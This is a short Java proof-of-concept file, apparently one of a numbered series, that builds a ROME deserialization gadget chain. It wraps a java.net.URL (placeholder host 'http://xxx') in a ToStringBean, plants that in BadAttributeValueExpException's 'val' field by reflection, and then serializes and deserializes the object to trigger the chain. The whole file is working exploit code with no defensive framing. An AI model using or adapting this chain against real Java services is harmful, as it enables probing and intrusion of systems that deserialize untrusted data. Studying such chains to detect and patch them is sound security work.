package com.example.Rome;

import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;
import com.sun.syndication.feed.impl.ToStringBean;

import javax.management.BadAttributeValueExpException;
import java.net.URL;

public class POC_9 {

    public static void main(String[] args) throws Exception {
        URL url = new URL("http://xxx");

        ToStringBean stringBean = new ToStringBean(URL.class, url);
        BadAttributeValueExpException bad = new BadAttributeValueExpException("1");
        ReflectionUtil.setField(bad, "val", stringBean);

        SerializeUtil.deserialize(SerializeUtil.serialize(bad));
    }

}
